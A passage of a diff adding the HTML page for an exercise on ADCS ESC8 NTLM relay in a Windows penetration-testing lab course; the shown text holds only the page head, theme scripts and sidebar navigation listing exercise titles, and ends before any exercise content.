@@ -1,0 +1,3672 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Windows penetration testing exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise 4.7: ADCS ESC8 (NTLM Relay to Web Enrollment) - Windows Penetration Testing</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-47-adcs-esc8-ntlm-relay-to-web-enrollment" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Windows Penetration Testing" class="md-header__button md-logo" aria-label="Windows Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Windows Penetration Testing
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise 4.7: ADCS ESC8 (NTLM Relay to Web Enrollment)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="blue"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Windows Penetration Testing" class="md-nav__button md-logo" aria-label="Windows Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Windows Penetration Testing
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH01 -- Enumeration
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH01 -- Enumeration
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/01_Basic_Port_Scan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.1 -- Basic Port Scan
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/02_Multiple_Port_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.2 -- Multiple Port Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/03_Service_Version_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.3 -- Service Version Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/04_OS_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.4 -- OS Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/05_Comprehensive_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.5 -- Comprehensive Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/06_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH02 -- SMB Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH02 -- SMB Reconnaissance
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/01_Connection_Test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.1 -- Connection Test
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/02_Share_Listing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.2 -- Share Listing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/03_Anonymous_Share_Access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.3 -- Anonymous Share Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/04_File_Retrieval/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.4 -- File Retrieval
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/05_Null_Session_Connection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.5 -- Null Session Connection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/06_Null_Session_Share_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.6 -- Null Session Share Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/07_User_Enumeration_via_Null_Session/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.7 -- User Enumeration via Null Session
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/08_Comprehensive_Null_Session_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.8 -- Comprehensive Null Session Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/09_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH03 -- SMB Credential Attacks
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH03 -- SMB Credential Attacks
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/01_Manual_Credential_Test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.1 -- Manual Credential Test
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/02_Multiple_Credential_Testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.2 -- Multiple Credential Testing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/03_Single_User_Brute_Force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.3 -- Single User Brute Force
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/04_Username_Enumeration_and_Brute_Force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.4 -- Username Enumeration and Brute Force
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/05_Full_Credential_Attack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.5 -- Full Credential Attack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/06_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH04 -- RDP Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH04 -- RDP Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/01_RDP_Service_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 4.1 -- RDP Service Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/02_RDP_Version_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 4.2 -- RDP Version Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/03_RDP_Manual_Connection_Test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 4.3 -- RDP Manual Connection Test
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/04_RDP_Credential_Guessing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 4.4 -- RDP Credential Guessing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/05_RDP_Brute_Force_Attack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 4.5 -- RDP Brute Force Attack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/06_RDP_Session_Access_and_Flag_Retrieval/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 4.6 -- RDP Session Access and Flag Retrieval
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/07_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH05 -- WinRM Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH05 -- WinRM Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/01_WinRM_Service_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 5.1 -- WinRM Service Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/02_WinRM_Version_Configuration_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 5.2 -- WinRM Version and Configuration Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/03_WinRM_Manual_Authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 5.3 -- WinRM Manual Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/04_WinRM_Credential_Brute_Force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 5.4 -- WinRM Credential Brute Force
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/05_WinRM_Command_Execution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 5.5 -- WinRM Command Execution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/06_WinRM_File_Retrieval/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 5.6 -- WinRM File Retrieval
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/07_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH06 -- MSSQL Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH06 -- MSSQL Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/01_MSSQL_Service_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 6.1 -- MS-SQL Service Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/02_MSSQL_Version_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
